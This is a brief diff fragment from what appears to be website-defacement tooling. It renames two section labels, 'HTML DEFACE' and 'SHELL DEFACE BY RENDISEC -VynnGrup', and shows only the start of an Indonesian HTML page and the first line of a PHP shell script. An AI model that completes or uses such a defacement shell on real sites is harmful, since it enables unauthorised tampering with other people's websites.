@@ -1,4 +1,4 @@
-HTML DEFACE
+[ HTML DEFACE ]
 
 <!DOCTYPE html>
 <html lang="id">
@@ -79,7 +79,7 @@ HTML DEFACE
 </body>
 </html>
 
-SHELL DEFACE BY RENDISEC -VynnGrup
+[ SHELL DEFACE BY RENDISEC -VynnGrup ]
 
 <?php
 $root = realpath(getcwd());
